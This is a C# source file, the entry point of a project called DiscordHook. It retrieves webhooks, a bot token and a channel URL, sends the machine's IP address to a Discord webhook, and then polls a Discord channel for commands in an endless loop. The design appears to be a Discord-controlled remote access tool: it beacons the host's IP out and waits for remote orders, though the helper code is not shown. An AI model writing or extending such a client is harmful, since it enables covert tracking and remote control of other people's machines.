using System.Threading.Tasks;
using static DiscordHook.Alerts;
using static DiscordHook.DiscordApi;
using static DiscordHook.CommandHandler;
using static DiscordHook.Utility;

namespace DiscordHook
{
    internal static class Program
    {
        private static async Task Main(string[] args)
        {
            var alerthook = await GetAlertWebHook();
            await Task.Delay(500);
            var replyhook = await GetReplyWebHook();
            await Task.Delay(500);
            var botToken = await GetBotToken();
            await Task.Delay(500);
            var channelurl = await GetChannelUrl();

            await SendHookAlertAsync(await GetIpAsync(), alerthook);

            while (true)
            {
                var command = await GetCommand(botToken, channelurl);
                await Task.Delay(1000);
            }

            
            // ReSharper disable once FunctionNeverReturns
        }
    }
}